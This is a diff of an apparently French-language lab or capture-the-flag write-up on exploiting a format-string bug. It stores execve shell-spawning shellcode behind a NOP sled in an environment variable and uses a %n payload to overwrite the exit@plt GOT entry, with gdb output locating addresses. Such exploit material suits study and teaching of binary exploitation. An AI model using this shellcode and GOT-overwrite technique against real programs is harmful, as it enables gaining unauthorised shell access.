@@ -35,13 +35,8 @@ export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x
 
 ```gdb
 (gdb) x/s *((char **)environ+0)
-0xffffd72f:      "EXPLOIT=\220\220\220"...
+0xffffd74a:      "EXPLOIT=\220\220\220"...
 
-(gdb) p/d 0xffffd72f+200
-$1 = 4294957047
-(gdb) p/x 0xffffd72f+200
-$2 = 0xffffd7f7
-```
 
 (gdb)  p/d 0xffffd74a+200
 $1 = 4294957074
@@ -66,6 +61,7 @@ $6 = 10221
   
 Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter numero 10  
   
+```bash
 export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")  
 
 (gdb) x/s *((char **)environ+0)  
@@ -94,7 +90,6 @@ Dump of assembler code for function exit@plt:
    0x08048370 <+0>:     jmp    *0x80497e0
    0x08048376 <+6>:     push   $0x18
    0x0804837b <+11>:    jmp    0x8048330
-```
   
 (gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + %4294957070\$x + '%10\$n'")
 0x0804847a in main ()
@@ -107,6 +102,7 @@ Breakpoint 2, 0x08048507 in main ()
 (gdb) x/5wx 0xffffd6b8
 0xffffd6b8:     0x080497e0      0x39323425      0x37353934      0x24303730
 0xffffd6c8:     0x00000a6e
+```  
 
 Nous pouvons voir que les bytes que nous avons rentrer dans le fgets() ne sont pas modifier, mais que nous n'avons pas jump sur notre shellcode
   
